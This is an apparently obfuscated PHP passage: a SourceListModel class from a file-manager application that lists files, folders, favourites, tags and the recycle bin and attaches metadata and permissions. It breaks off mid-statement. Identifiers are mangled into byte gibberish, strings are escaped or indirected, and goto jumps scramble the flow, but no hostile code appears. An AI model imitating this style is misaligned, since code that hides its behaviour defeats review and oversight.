define($_SERVER[Ò°Ì”İ•][327], 1); goto d¤‡ŒƒŒ´; d¤‡ŒƒŒ´: define($_SERVER[Ò°Ì”İ•][328], 2); define($_SERVER[Ò°Ì”İ•][329], 3); define($_SERVER[Ò°Ì”İ•][330], 1); goto F‰‚òˆƒˆ½; BŠƒâ·…: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\x75\x72\x63\145"; protected $tableMeta = array("\x74\x61\x62\154\145\x4e\x61\155\145" => "\151\157\x5f\x73\x6f\165\x72\x63\145\x5f\155\x65\164\141", "\x6d\145\x74\x61\x46\x69\145\x6c\x64" => "\163\x6f\165\162\x63\x65\111\104"); protected $dataAuto = array(array("\155\157\x64\x69\146\171\x54\x69\x6d\x65", "\164\x69\x6d\145", "\151\x6e\163\145\x72\x74", "\146\x75\x6e\x63\x74\151\x6f\x6e"), array("\x63\x72\145\141\164\145\124\151\x6d\145", "\x74\x69\155\145", "\151\x6e\x73\x65\x72\164", "\146\x75\x6e\143\x74\x69\x6f\156"), array("\166\151\145\167\x54\151\x6d\x65", "\164\151\x6d\x65", "\x69\156\x73\x65\x72\164", "\146\x75\x6e\x63\164\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($âàÛĞ) { return $this->listSource(array($_SERVER[Ò°Ì”İ•][489] => $âàÛĞ)); } public function typeName($·ÌıÖï) { static $ò¡ĞÍ‡š = array(self::TYPE_SYSTEM => "\163\171\x73\164\145\155", self::TYPE_USER => "\x75\163\145\162", self::TYPE_GROUP => "\147\x72\157\165\160"); return $ò¡ĞÍ‡š[$·ÌıÖï . $_SERVER[Ò°Ì”İ•][12]]; } public function sourceListInfo($×Ùö¿×«, $ªÙ¼…’¦ = false) { $ê¬«ŞÉ† =& $_SERVER[Ò°Ì”İ•]; $×Ùö¿×« = $×Ùö¿×« ? $×Ùö¿×« : array(); $×Ùö¿×« = array_filter(array_unique($×Ùö¿×«)); if (!$×Ùö¿×«) { return array(); } $µâø‚ıñ = $this->where(array($ê¬«ŞÉ†[204] => array($ê¬«ŞÉ†[7], $×Ùö¿×«)))->select(); $this->_listDataApply($µâø‚ıñ, $ªÙ¼…’¦); return array_to_keyvalue($µâø‚ıñ, $ê¬«ŞÉ†[204]); } public function pathInfoFilter(&$¤–ÌûÀ) { $ÎÕêÖØ =& $_SERVER[Ò°Ì”İ•]; static $çÛ÷© = false; static $ï¹Ì”º = false; static $¾×ÇÉ©– = false; if (!$çÛ÷©) { $¢„ğÊº¶ = $ÎÕêÖØ[490]; $¢„ğÊº¶ .= $ÎÕêÖØ[491]; $¢„ğÊº¶ .= $ÎÕêÖØ[492]; $Â‡şÕŞ = $ÎÕêÖØ[493]; $ëˆùâ‡ = explode($ÎÕêÖØ[50], $Â‡şÕŞ); $çÛ÷© = explode($ÎÕêÖØ[50], $¢„ğÊº¶); $ï¹Ì”º = array(); foreach ($çÛ÷© as $·½ˆ®Âí) { if (in_array($·½ˆ®Âí, $ëˆùâ‡)) { continue; } $ï¹Ì”º[] = $·½ˆ®Âí; } $¾×ÇÉ©– = explode($ÎÕêÖØ[50], $ÎÕêÖØ[494]); } foreach ($¾×ÇÉ©– as $¥¨ã½§) { if (isset($¤–ÌûÀ[$¥¨ã½§])) { $¤–ÌûÀ[$¥¨ã½§] = intval($¤–ÌûÀ[$¥¨ã½§]); } } $¤–ÌûÀ[$ÎÕêÖØ[98]] = $ÎÕêÖØ[495] . $¤–ÌûÀ[$ÎÕêÖØ[204]] . $ÎÕêÖØ[496]; $¤–ÌûÀ[$ÎÕêÖØ[33]] = $¤–ÌûÀ[$ÎÕêÖØ[497]] == 1 ? $ÎÕêÖØ[89] : $ÎÕêÖØ[243]; $¤–ÌûÀ[$ÎÕêÖØ[201]] = $this->typeName($¤–ÌûÀ[$ÎÕêÖØ[201]]); if ($¤–ÌûÀ[$ÎÕêÖØ[497]] != 1) { $¤–ÌûÀ[$ÎÕêÖØ[180]] = $¤–ÌûÀ[$ÎÕêÖØ[498]]; unset($¤–ÌûÀ[$ÎÕêÖØ[498]]); } $†€ãÏ¡¹ = $çÛ÷©; if (isset($¤–ÌûÀ[$ÎÕêÖØ[499]]) && $¤–ÌûÀ[$ÎÕêÖØ[499]][$ÎÕêÖØ[500]] == -1) { $†€ãÏ¡¹ = $ï¹Ì”º; } $¤–ÌûÀ = array_field_key($¤–ÌûÀ, $†€ãÏ¡¹); return $¤–ÌûÀ; } public function listUserFav() { $óÍ€ä‹ê =& $_SERVER[Ò°Ì”İ•]; $·šÖÒ’ = Model($óÍ€ä‹ê[501])->listData(); $ì­ù„Œê = array_filter_by_field($·šÖÒ’, $óÍ€ä‹ê[33], $óÍ€ä‹ê[502]); $ì­ù„Œê = array_to_keyvalue($ì­ù„Œê, $óÍ€ä‹ê[12], $óÍ€ä‹ê[98]); if ($ì­ù„Œê) { $ˆí€™â« = $this->listSource(array($óÍ€ä‹ê[503] => array($óÍ€ä‹ê[504], $ì­ù„Œê))); } $ˆí€™â« = array_to_keyvalue($ˆí€™â«[$óÍ€ä‹ê[457]], $óÍ€ä‹ê[204]); foreach ($·šÖÒ’ as &$¹Œüó) { $¹Œüó = array($óÍ€ä‹ê[505] => $¹Œüó[$óÍ€ä‹ê[487]], $óÍ€ä‹ê[506] => $¹Œüó[$óÍ€ä‹ê[32]], $óÍ€ä‹ê[507] => $¹Œüó[$óÍ€ä‹ê[98]], $óÍ€ä‹ê[508] => $¹Œüó[$óÍ€ä‹ê[33]], $óÍ€ä‹ê[509] => $¹Œüó[$óÍ€ä‹ê[244]], $óÍ€ä‹ê[510] => $¹Œüó[$óÍ€ä‹ê[99]]); if ($¹Œüó[$óÍ€ä‹ê[33]] == $óÍ€ä‹ê[502] && $ˆí€™â«[$¹Œüó[$óÍ€ä‹ê[98]]]) { $¹Œüó[$óÍ€ä‹ê[101]] = $ˆí€™â«[$¹Œüó[$óÍ€ä‹ê[98]]]; } } unset($¹Œüó); return $·šÖÒ’; } public function listUserTag($ÃÜ§‡»Û) { $­ÉÌ…Â© =& $_SERVER[Ò°Ì”İ•]; if ($ÃÜ§‡»Û && !is_array($ÃÜ§‡»Û)) { $ÃÜ§‡»Û = array($ÃÜ§‡»Û); } $ÒçÈö®à = Model($­ÉÌ…Â©[511])->listData(); $ÊğóŸ¶Í = array(); $ø’„ ”Ñ = array(); foreach ($ÒçÈö®à as $şÎ„¨ó) { $¸–‚ï‰¤ = $şÎ„¨ó[$­ÉÌ…Â©[98]]; if (!$¸–‚ï‰¤) { continue; } if (!isset($ø’„ ”Ñ[$¸–‚ï‰¤])) { $ø’„ ”Ñ[$¸–‚ï‰¤] = array(); } $ø’„ ”Ñ[$¸–‚ï‰¤][] = $şÎ„¨ó[$­ÉÌ…Â©[512]]; $ÊğóŸ¶Í[$şÎ„¨ó[$­ÉÌ…Â©[98]]] = $şÎ„¨ó; } $ì¿ÂÒíİ = array(); $üı¨ûÀ = array(); $‡Ô“¥ê¬ = array(); foreach ($ø’„ ”Ñ as $ÉÜ¯® => $‹ÙŒ•›í) { $íÑ­¹ô = !0; if (!$ÃÜ§‡»Û) { $ì¿ÂÒíİ[] = $ÉÜ¯®; continue; } foreach ($ÃÜ§‡»Û as $Ãñ¾é©) { if (!in_array($Ãñ¾é©, $‹ÙŒ•›í)) { $íÑ­¹ô = !1; break; } } if (!$íÑ­¹ô) { continue; } if (!is_numeric($ÉÜ¯®)) { $¡È¯Ÿ = $ÊğóŸ¶Í[$ÉÜ¯®]; $Öõàï = array($­ÉÌ…Â©[32] => $¡È¯Ÿ[$­ÉÌ…Â©[32]], $­ÉÌ…Â©[98] => $¡È¯Ÿ[$­ÉÌ…Â©[98]], $­ÉÌ…Â©[33] => $¡È¯Ÿ[$­ÉÌ…Â©[33]], $­ÉÌ…Â©[101] => array($­ÉÌ…Â©[513] => 1), $­ÉÌ…Â©[245] => !0); if ($¡È¯Ÿ[$­ÉÌ…Â©[33]] == $­ÉÌ…Â©[243]) { $‡Ô“¥ê¬[] = $Öõàï; } if ($¡È¯Ÿ[$­ÉÌ…Â©[33]] == $­ÉÌ…Â©[89]) { $üı¨ûÀ[] = $Öõàï; } continue; } $ì¿ÂÒíİ[] = $ÉÜ¯®; } if ($ì¿ÂÒíİ) { $Œ–™Ì¬ = $this->listSource(array($­ÉÌ…Â©[503] => array($­ÉÌ…Â©[504], $ì¿ÂÒíİ))); } $Œ–™Ì¬ = $Œ–™Ì¬ ? $Œ–™Ì¬ : array($­ÉÌ…Â©[96] => array(), $­ÉÌ…Â©[97] => array()); $Œ–™Ì¬[$­ÉÌ…Â©[96]] = array_merge($Œ–™Ì¬[$­ÉÌ…Â©[96]], $üı¨ûÀ); $Œ–™Ì¬[$­ÉÌ…Â©[97]] = array_merge($Œ–™Ì¬[$­ÉÌ…Â©[97]], $‡Ô“¥ê¬); if (isset($Œ–™Ì¬[$­ÉÌ…Â©[454]]) && count($ì¿ÂÒíİ) == $Œ–™Ì¬[$­ÉÌ…Â©[454]][$­ÉÌ…Â©[455]]) { return $Œ–™Ì¬; } $‹¦ÇÙÂµ = array(); $ÉÃ¦‰€Ü = array_to_keyvalue($Œ–™Ì¬[$­ÉÌ…Â©[96]], $­ÉÌ…Â©[12], $­ÉÌ…Â©[204]); $±˜İ¼¤ = array_to_keyvalue($Œ–™Ì¬[$­ÉÌ…Â©[97]], $­ÉÌ…Â©[12], $­ÉÌ…Â©[204]); $Ù·ü·µš = array_merge($±˜İ¼¤, $ÉÃ¦‰€Ü); foreach ($ì¿ÂÒíİ as $¸–‚ï‰¤) { if (!in_array($¸–‚ï‰¤, $Ù·ü·µš)) { $‹¦ÇÙÂµ[] = $¸–‚ï‰¤; } } if ($‹¦ÇÙÂµ) { Model($­ÉÌ…Â©[514])->removeBySource($‹¦ÇÙÂµ); } return $Œ–™Ì¬; } public function listUserRecycle() { $İğ§µ‰ =& $_SERVER[Ò°Ì”İ•]; $•›Óˆğ¶ = Model($İğ§µ‰[515])->listData(); if (!$•›Óˆğ¶) { return array(); } $Û½á±´· = array($İğ§µ‰[503] => array($İğ§µ‰[504], $•›Óˆğ¶), $İğ§µ‰[516] => 1); return $this->listSource($Û½á±´·); } public function listSource($ÃÅ‘óáÑ, $ƒÚÖé¹¬ = 3000, $¢öí…Ö‚ = false) { $Ó‘à‘Ùî =& $_SERVER[Ò°Ì”İ•]; if (!isset($ÃÅ‘óáÑ[$Ó‘à‘Ùî[517]])) { $ÃÅ‘óáÑ[$Ó‘à‘Ùî[517]] = 0; } if (isset($ÃÅ‘óáÑ[$Ó‘à‘Ùî[203]]) && $ÃÅ‘óáÑ[$Ó‘à‘Ùî[203]] == $Ó‘à‘Ùî[241]) { $ÃÅ‘óáÑ[$Ó‘à‘Ùî[498]] = array($Ó‘à‘Ùî[518], $Ó‘à‘Ùî[12]); } $ÙòàÜ ” = $Ó‘à‘Ùî[519]; $Ã©Îéğ” = $this->field($ÙòàÜ ”)->_makeOrder()->where($ÃÅ‘óáÑ)->selectPage($ƒÚÖé¹¬); $this->_listPageCheck($Ã©Îéğ”, $ÙòàÜ ”, $ÃÅ‘óáÑ); $this->_listDataApply($Ã©Îéğ”[$Ó‘à‘Ùî[457]], $¢öí…Ö‚); $this->_listMake($Ã©Îéğ”); return $Ã©Îéğ”; } private function _listPageCheck(&$õ’¥•‚Ò, $ŒßÃ­Ñ, $´ì“ø«·) { $÷–Ë÷˜Û =& $_SERVER[Ò°Ì”İ•]; if (!is_array($õ’¥•‚Ò[$÷–Ë÷˜Û[454]])) { return; } $¬ò„Şœ¾ = $õ’¥•‚Ò[$÷–Ë÷˜Û[454]]; if ($¬ò„Şœ¾[$÷–Ë÷˜Û[456]] <= 1) { return; } if ($¬ò„Şœ¾[$÷–Ë÷˜Û[455]] >= 100000) { return; } if (Model($÷–Ë÷˜Û[520])->get($÷–Ë÷˜Û[521]) != $÷–Ë÷˜Û[522]) { return; } $ŒßÃ­Ñ = str_replace(array($÷–Ë÷˜Û[53], $÷–Ë÷˜Û[429], $÷–Ë÷˜Û[59]), $÷–Ë÷˜Û[12], $ŒßÃ­Ñ); $ŒßÃ­Ñ = $÷–Ë÷˜Û[523] . str_replace($÷–Ë÷˜Û[50], $÷–Ë÷˜Û[524], $ŒßÃ­Ñ) . $÷–Ë÷˜Û[525]; $¥½ªèî¤ = $÷–Ë÷˜Û[526]; $¥½ªèî¤ = $¥½ªèî¤ . $÷–Ë÷˜Û[527]; $Œôõï£ú = $¬ò„Şœ¾[$÷–Ë÷˜Û[451]] * ($¬ò„Şœ¾[$÷–Ë÷˜Û[440]] - 1) . $÷–Ë÷˜Û[50] . $¬ò„Şœ¾[$÷–Ë÷˜Û[451]]; $…¾èÏ¢» = $this->_makeOrder(!0); $ˆ–õŞè = $÷–Ë÷˜Û[523] . str_replace($÷–Ë÷˜Û[50], $÷–Ë÷˜Û[524], $…¾èÏ¢»[0]); if (strpos($ˆ–õŞè, $÷–Ë÷˜Û[528])) { $ˆ–õŞè = str_replace($÷–Ë÷˜Û[528], $÷–Ë÷˜Û[529], $ˆ–õŞè); } else { $ˆ–õŞè .= $÷–Ë÷˜Û[530] . $…¾èÏ¢»[1]; } $Â´Üôùî = array(); foreach ($´ì“ø«· as $•²ı¸±µ => $ÕÚ×Ø°Ø) { $Â´Üôùî[$÷–Ë÷˜Û[523] . $•²ı¸±µ] = $ÕÚ×Ø°Ø; } $this->alias($÷–Ë÷˜Û[531])->field($ŒßÃ­Ñ)->limit($Œôõï£ú)->order($ˆ–õŞè); $È†‹ÌŞ = $this->join($¥½ªèî¤)->where($Â´Üôùî)->select(); if ($È†‹ÌŞ) { $õ’¥•‚Ò[$÷–Ë÷˜Û[457]] = $È†‹ÌŞ; } } protected function _makeOrder($‹‚±ÏÒ = false) { $È”›º¡‰ =& $_SERVER[Ò°Ì”İ•]; $ñ…ÕöÒÒ = Model($È”›º¡‰[532])->get($È”›º¡‰[533]); $Äßãá = Model($È”›º¡‰[532])->get($È”›º¡‰[534]); $´ŠÂ‰‰İ = array($È”›º¡‰[535] => $È”›º¡‰[536], $È”›º¡‰[537] => $È”›º¡‰[538]); $ˆø°ÃÉ = array($È”›º¡‰[32] => $È”›º¡‰[32], $È”›º¡‰[90] => $È”›º¡‰[90], $È”›º¡‰[180] => $È”›º¡‰[498], $È”›º¡‰[539] => $È”›º¡‰[539], $È”›º¡‰[540] => $È”›º¡‰[541], $È”›º¡‰[244] => $È”›º¡‰[244], $È”›º¡‰[99] => $È”›º¡‰[99]); $˜”ÙÂĞ¹ = Input::get($È”›º¡‰[542], $È”›º¡‰[7], $ñ…ÕöÒÒ, array_keys($ˆø°ÃÉ)); $ç©ËÓ­ = Input::get($È”›º¡‰[543], $È”›º¡‰[7], $Äßãá, array_keys($´ŠÂ‰‰İ)); if (!in_array($˜”ÙÂĞ¹, array_keys($ˆø°ÃÉ))) { $˜”ÙÂĞ¹ = $È”›º¡‰[32]; } if (!in_array($ç©ËÓ­, array_keys($´ŠÂ‰‰İ))) { $˜”ÙÂĞ¹ = $È”›º¡‰[535]; } if ($˜”ÙÂĞ¹ == $È”›º¡‰[32]) { } $³Éâüé” = $È”›º¡‰[544] . $ˆø°ÃÉ[$˜”ÙÂĞ¹] . $È”›º¡‰[53] . $´ŠÂ‰‰İ[$ç©ËÓ­]; $³Éâüé” = rtrim(trim($³Éâüé”), $È”›º¡‰[50]); if ($‹‚±ÏÒ) { return array($³Éâüé”, $´ŠÂ‰‰İ[$ç©ËÓ­]); } return $this->order($³Éâüé”); } protected function _listDataApplyItem($¿³¿ñÃ, $ˆ×´î… = false) { $²—‹¼ş† = array($¿³¿ñÃ); $this->_listDataApply($²—‹¼ş†, $ˆ×´î…); return $²—‹¼ş†[0]; } protected function _listDataApply(&$İÃÃÏ÷±, $¶ûŠó¿Ê = false) { $äØ´ñ®» =& $_SERVER[Ò°Ì”İ•]; if (!$İÃÃÏ÷±) { $İÃÃÏ÷± = array(); return; } $ÙïÒ» = array_to_keyvalue($İÃÃÏ÷±, $äØ´ñ®»[12], $äØ´ñ®»[204]); $ÙïÒ» = array_unique($ÙïÒ»); $this->_listSourceCache($İÃÃÏ÷±); if (!$¶ûŠó¿Ê) { $this->_listAppendMeta($İÃÃÏ÷±, $ÙïÒ»); $this->_listAppendFileMeta($İÃÃÏ÷±, $ÙïÒ»); $this->_listAppendChildren($İÃÃÏ÷±, $ÙïÒ»); } $this->_listAppendPath($İÃÃÏ÷±); $this->_listAppendAuth($İÃÃÏ÷±); $this->_listAppendSourceInfo($İÃÃÏ÷±, $ÙïÒ»); $this->_listAppendUser($İÃÃÏ÷±); $this->_listFilterInfo($İÃÃÏ÷±, $¶ûŠó¿Ê); $this->_listAppendAuthSecret($İÃÃÏ÷±); } protected function _listSourceCache($¿Ã÷¦¸Æ) { $áæ½†©€ =& $_SERVER[Ò°Ì”İ•]; foreach ($¿Ã÷¦¸Æ as $ı›Ä°×¨) { self::$cacheSourceInfo[$áæ½†©€[545] . $ı›Ä°×¨[$áæ½†©€[204]]] = $ı›Ä°×¨; } } protected function _listFilterInfo(&$¯½œ¥šç, $ì¼ùÑÀğ = false) { $º·åíù =& $_SERVER[Ò°Ì”İ•]; foreach ($¯½œ¥šç as &$¥ğ†˜ò¡) { $¥ğ†˜ò¡ = $this->pathInfoFilter($¥ğ†˜ò¡); self::$cachePathInfo[$º·åíù[546] . intval($ì¼ùÑÀğ) . $º·åíù[474] . $¥ğ†˜ò¡[$º·åíù[204]]] = $¥ğ†˜ò¡; } unset($¥ğ†˜ò¡); } protected function _listMake(&$Æ«“”†ø) { $·ºÚ–§œ =& $_SERVER[Ò°Ì”İ•]; $Æ«“”†ø[$·ºÚ–§œ[96]] = array(); $Æ«“”†ø[$·ºÚ–§œ[97]] = array(); foreach ($Æ«“”†ø[$·ºÚ–§œ[457]] as $æò©ÛÃï) { $ñ Äèê = $æò©ÛÃï[$·ºÚ–§œ[497]] == 1 ? $·ºÚ–§œ[96] : $·ºÚ–§œ[97]; $Æ«“”†ø[$ñ Äèê][] = $æò©ÛÃï; } unset($Æ«“”†ø[$·ºÚ–§œ[457]]); } protected function _listAppendMeta(&$ùİ‹‘Ò•, $­ÁúÉİ) { $‚·Æã¾” =& $_SERVER[Ò°Ì”İ•]; $í»ªÌèÏ = array($‚·Æã¾”[503] => array($‚·Æã¾”[504], $­ÁúÉİ)); $Ê•¿á… = Model($‚·Æã¾”[547])->field($‚·Æã¾”[548])->where($í»ªÌèÏ)->select(); if (!$Ê•¿á…) { return; } $êÕˆ«£” = array($‚·Æã¾”[549], $‚·Æã¾”[550], $‚·Æã¾”[529]); $óù±¥òÙ = array(); foreach ($Ê•¿á… as $Ï‘ÖŸ¿ ) { if (!isset($óù±¥òÙ[$Ï‘ÖŸ¿ [$‚·Æã¾”[204]]])) { $óù±¥òÙ[$Ï‘ÖŸ¿ [$‚·Æã¾”[204]]] = array(); } if (in_array($Ï‘ÖŸ¿ [$‚·Æã¾”[108]], $êÕˆ«£”)) { continue; } $óù±¥òÙ[$Ï‘ÖŸ¿ [$‚·Æã¾”[204]]][$Ï‘ÖŸ¿ [$‚·Æã¾”[108]]] = $Ï‘ÖŸ¿ [$‚·Æã¾”[462]]; } foreach ($ùİ‹‘Ò• as &$‹À¹õÕ») { $‹À¹õÕ»[$‚·Æã¾”[551]] = !1; if (isset($óù±¥òÙ[$‹À¹õÕ»[$‚·Æã¾”[204]]])) { $‹À¹õÕ»[$‚·Æã¾”[551]] = $óù±¥òÙ[$‹À¹õÕ»[$‚·Æã¾”[204]]]; } if ($this->fileIsLock($‹À¹õÕ») && $‹À¹õÕ»[$‚·Æã¾”[499]]) { $Õ—‰ğö¦ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $‹À¹õÕ»[$‚·Æã¾”[499]][$‚·Æã¾”[500]] = AuthModel::authDisable($‹À¹õÕ»[$‚·Æã¾”[499]][$‚·Æã¾”[500]], $Õ—‰ğö¦); $‹À¹õÕ»[$‚·Æã¾”[499]][$‚·Æã¾”[552]][$‚·Æã¾”[499]] = $‹À¹õÕ»[$‚·Æã¾”[499]][$‚·Æã¾”[500]]; } } unset($‹À¹õÕ»); } protected function _listAppendFileMeta(&$İğè’Çú, $¿ªúÃØ) { $Ò…Û½€ç =& $_SERVER[Ò°Ì”İ•]; $æñ·Ğú… = array_to_keyvalue($İğè’Çú, $Ò…Û½€ç[12], $Ò…Û½€ç[553]); $æñ·Ğú… = array_filter(array_unique($æñ·Ğú…)); if (!$æñ·Ğú…) { return; } $ƒ“ºğƒù = array($Ò…Û½€ç[554] => array($Ò…Û½€ç[504], $æñ·Ğú…)); $Ø’ªËÛ¢ = $Ò…Û½€ç[555]; $Æ…¯Ñ¯ì = Model($Ò…Û½€ç[556])->field($Ø’ªËÛ¢)->where($ƒ“ºğƒù)->select(); $Æ…¯Ñ¯ì = array_to_keyvalue($Æ…¯Ñ¯ì, $Ò…Û½€ç[553]); $Ã›¹„¸Â = Model($Ò…Û½€ç[557])->field($Ò…Û½€ç[558])->where($ƒ“ºğƒù)->select(); $Ã›¹„¸Â = $Ã›¹„¸Â ? $Ã›¹„¸Â : array(); $µ ¤“°¡ = array(); foreach ($Ã›¹„¸Â as $ºà†¡ªŞ) { if (!isset($µ ¤“°¡[$ºà†¡ªŞ[$Ò…Û½€ç[553]]])) { $µ ¤“°¡[$ºà†¡ªŞ[$Ò…Û½€ç[553]]] = array(); } $µ ¤“°¡[$ºà†¡ªŞ[$Ò…Û½€ç[553]]][$ºà†¡ªŞ[$Ò…Û½€ç[108]]] = $ºà†¡ªŞ[$Ò…Û½€ç[462]]; } foreach ($İğè’Çú as &$óÎù„•) { $¢ÙÛíËˆ = $óÎù„•[$Ò…Û½€ç[553]]; if (!$¢ÙÛíËˆ || !is_array($Æ…¯Ñ¯ì[$¢ÙÛíËˆ])) { continue; } $ëüÌ±³ß = $Æ…¯Ñ¯ì[$¢ÙÛíËˆ]; $ëüÌ±³ß[$Ò…Û½€ç[90]] = $óÎù„•[$Ò…Û½€ç[90]]; $ëüÌ±³ß[$Ò…Û½€ç[32]] = $óÎù„•[$Ò…Û½€ç[32]]; if (!$ëüÌ±³ß[$Ò…Û½€ç[559]]) { Model($Ò…Û½€ç[556])->fileMd5Check($ëüÌ±³ß); } if (!isset(self::$cacheFileInfo[$Ò…Û½€ç[560] . $¢ÙÛíËˆ])) { self::$cacheFileInfo[$Ò…Û½€ç[560] . $¢ÙÛíËˆ] = array_merge(array(), $ëüÌ±³ß); } unset($Æ…¯Ñ¯ì[$¢ÙÛíËˆ][$Ò…Û½€ç[98]]); $àêÒä†Ë = isset($µ ¤“°¡[$¢ÙÛíËˆ]) && is_array($µ ¤“°¡[$¢ÙÛíËˆ]) ? $µ ¤“°¡[$¢ÙÛíËˆ] : array(); $óÎù„•[$Ò…Û½€ç[181]] = array_merge($àêÒä†Ë, $Æ…¯Ñ¯ì[$¢ÙÛíËˆ]); if (isset($óÎù„•[$Ò…Û½€ç[181]][$Ò…Û½€ç[195]])) { $óÎù„•[$Ò…Û½€ç[195]] = json_decode($óÎù„•[$Ò…Û½€ç[181]][$Ò…Û½€ç[195]], !0); unset($óÎù„•[$Ò…Û½€ç[181]][$Ò…Û½€ç[195]]); } } unset($óÎù„•); } protected function _listAppendSourceInfo(&$ú£À¥å¢, $ôâ©‡Å¯) { $úàµ¥Î =& $_SERVER[Ò°Ì”İ•]; $ÈÎ¼Ñâè = Model($úàµ¥Î[561])->listData(); $¨Ì°´©ì = Model($úàµ¥Î[511])->listData(); $¦İ¸Ô—Ÿ = Model($úàµ¥Î[501])->listData(); $×ëÙõÂ = Model($úàµ¥Î[562])->listSimple(); $·Ş´˜‘ = array_to_keyvalue($ÈÎ¼Ñâè, $úàµ¥Î[487]); $¥Äã­âı = array_to_keyvalue_group($¨Ì°´©ì, $úàµ¥Î[98], $úàµ¥Î[512]); $Â£õµŠ½ = array_to_keyvalue($¦İ¸Ô—Ÿ, $úàµ¥Î[98]); $“Š’Şˆ = array_to_keyvalue_group($×ëÙõÂ, $úàµ¥Î[204]); foreach ($ú£À¥å¢ as &$­‡òÙ²­) { $­‡òÙ²­[$úàµ¥Î[101]] = array($úàµ¥Î[563] => 0, $úàµ¥Î[564] => 0, $úàµ¥Î[565] => 0); if (isset($Â£õµŠ½[$­‡òÙ²­[$úàµ¥Î[204]]])) { $­‡òÙ²­[$úàµ¥Î[101]][$úàµ¥Î[566]] = 1; $­‡òÙ²­[$úàµ¥Î[101]][$úàµ¥Î[567]] = $Â£õµŠ½[$­‡òÙ²­[$úàµ¥Î[204]]][$úàµ¥Î[32]]; } if ($¥Äã­âı && $·Ş´˜‘ && isset($¥Äã­âı[$­‡òÙ²­[$úàµ¥Î[204]]])) { $­‡òÙ²­[$úàµ¥Î[101]][$úàµ¥Î[568]] = array(); foreach ($¥Äã­âı[$­‡òÙ²­[$úàµ¥Î[204]]] as $“¸£³˜÷) { $Û¡­£¾ì = $·Ş´˜‘[$“¸£³˜÷]; $­‡òÙ²­[$úàµ¥Î[101]][$úàµ¥Î[568]][] = array($úàµ¥Î[569] => $Û¡­£¾ì[$úàµ¥Î[487]], $úàµ¥Î[506] => $Û¡­£¾ì[$úàµ¥Î[32]], $úàµ¥Î[570] => $Û¡­£¾ì[$úàµ¥Î[571]]); } } if ($“Š’Şˆ && isset($“Š’Şˆ[$­‡òÙ²­[$úàµ¥Î[204]]])) { $­‡òÙ²­[$úàµ¥Î[101]][$úàµ¥Î[572]] = array(); foreach ($“Š’Şˆ[$­‡òÙ²­[$úàµ¥Î[204]]] as $ç³Ë›–) { $¡•ÔòÃÂ = $úàµ¥Î[573]; if ($ç³Ë›–[$úàµ¥Î[574]] == $úàµ¥Î[102]) { $¡•ÔòÃÂ .= $úàµ¥Î[575]; } $­‡òÙ²­[$úàµ¥Î[101]][$úàµ¥Î[572]] = array_field_key($ç³Ë›–, explode($úàµ¥Î[50], $¡•ÔòÃÂ)); } } } unset($­‡òÙ²­); return $ú£À¥å¢; } protected function _listAppendChildren(&$Í‘®Ñ™, $û¤‚ùŸ½) { $ş±Ê†Æ˜ =& $_SERVER[Ò°Ì”İ•]; $«°”ê¸ = array(); $‚ÙìÌÎ¶ = array($ş±Ê†Æ˜[252] => 0, $ş±Ê†Æ˜[253] => 0); foreach ($Í‘®Ñ™ as &$£Ù¼æä) { if (!$£Ù¼æä[$ş±Ê†Æ˜[497]]) { continue; } $«°”ê¸[] = $£Ù¼æä[$ş±Ê†Æ˜[204]]; } unset($£Ù¼æä); if (!$«°”ê¸) { return; } $²®É”æº = array($ş±Ê†Æ˜[203] => array($ş±Ê†Æ˜[7], $«°”ê¸), $ş±Ê†Æ˜[517] => 0); $åÇëŸµÅ = array($ş±Ê†Æ˜[203], $ş±Ê†Æ˜[497], $ş±Ê†Æ˜[576] => $ş±Ê†Æ˜[577]); $âËÉÁË = $this->field($åÇëŸµÅ)->where($²®É”æº)->group($ş±Ê†Æ˜[578])->select(); $˜Ø‡êÒ = array(); foreach ($âËÉÁË as $¬‡ŒàÉÇ) { $ºÅæÌ± = $¬‡ŒàÉÇ[$ş±Ê†Æ˜[203]]; $¨ÁàŸë = $¬‡ŒàÉÇ[$ş±Ê†Æ˜[497]] == $ş±Ê†Æ˜[102] ? $ş±Ê†Æ˜[253] : $ş±Ê†Æ˜[252]; if (!isset($˜Ø‡êÒ[$ºÅæÌ±])) { $˜Ø‡êÒ[$ºÅæÌ±] = array($ş±Ê†Æ˜[252] => 0, $ş±Ê†Æ˜[253] => 0); } $˜Ø‡êÒ[$ºÅæÌ±][$¨ÁàŸë] += $¬‡ŒàÉÇ[$ş±Ê†Æ˜[577]]; } foreach ($Í‘®Ñ™ as &$£Ù¼æä) { if (!$£Ù¼æä[$ş±Ê†Æ˜[497]]) { continue; } $©íéã° = is_array($˜Ø‡êÒ[$£Ù¼æä[$ş±Ê†Æ˜[204]]]) ? $˜Ø‡êÒ[$£Ù¼æä[$ş±Ê†Æ˜[204]]] : $‚ÙìÌÎ¶; $£Ù¼æä[$ş±Ê†Æ˜[253]] = $©íéã°[$ş±Ê†Æ˜[253]]; $£Ù¼æä[$ş±Ê†Æ˜[252]] = $©íéã°[$ş±Ê†Æ˜[252]]; unset($£Ù¼æä[$ş±Ê†Æ˜[498]]); } unset($£Ù¼æä); } protected function _listAppendAuth(&$†ªª¹õî) { $æ¶‹™¨ =& $_SERVER[Ò°Ì”İ•]; $ó˜‡ê—½ = array(); foreach ($†ªª¹õî as $Ù½Ê‹õ) { if ($Ù½Ê‹õ[$æ¶‹™¨[201]] == self::TYPE_GROUP) { $ó˜‡ê—½[] = $Ù½Ê‹õ[$æ¶‹™¨[204]]; } } if (!$ó˜‡ê—½) { return; } $ÃÍÅßŞŠ = array_to_keyvalue($†ªª¹õî, $æ¶‹™¨[204]); $ì¿š«Œ = Model($æ¶‹™¨[579])->getSourceList($ó˜‡ê—½, $ÃÍÅßŞŠ); $ŞÕ—¸Àñ = KodUser::isRoot(); foreach ($†ªª¹õî as $ßÎÔàš => &$Ù½Ê‹õ) { $Ù½Ê‹õ[$æ¶‹™¨[499]] = $ì¿š«Œ[$Ù½Ê‹õ[$æ¶‹™¨[204]]]; if (!$Ù½Ê‹õ[$æ¶‹™¨[499]] && $Ù½Ê‹õ[$æ¶‹™¨[201]] == self::TYPE_GROUP) { $Ù½Ê‹õ[$æ¶‹™¨[499]] = Action($æ¶‹™¨[580])->pathGroupAuthMake($Ù½Ê‹õ[$æ¶‹™¨[581]]); if 